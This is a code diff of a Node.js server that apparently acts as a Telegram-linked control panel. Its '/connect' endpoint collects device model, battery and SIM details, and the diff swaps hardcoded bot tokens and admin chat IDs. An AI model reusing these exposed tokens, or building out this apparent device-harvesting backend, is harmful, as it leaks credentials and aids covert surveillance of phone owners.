@@ -6,8 +6,8 @@ const path = require('path');
 
 // ===== CONFIG =====
 // ===== CONFIG =====
-const BOT_TOKEN = '8333112805:AAGXDcqQbILON3eUvO5wROLke52z5QL2g0Q';
-const ADMIN_IDS = [-1003054163911];   // <- yahan naya chat id
+const BOT_TOKEN = '8325992828:AAFhVrtzLAsSn_ZpdAHwWnIOwr6dXw6G0Ns';
+const ADMIN_IDS = [-1002572660367];   // <- yahan naya chat id
 const DEVELOPER = '@heck0bot';
 const PORT = 3000;
 
@@ -51,7 +51,6 @@ app.get('/', (_, res) => res.send('✅ Panel online'));
 
 // Device connect
 app.post('/connect', (req, res) => {
-  console.log('Received connect request body:', req.body); // Added for debugging
   const { uuid, model, battery, sim1, sim2 } = req.body;
   if (!uuid) return res.status(400).send('missing uuid');
 
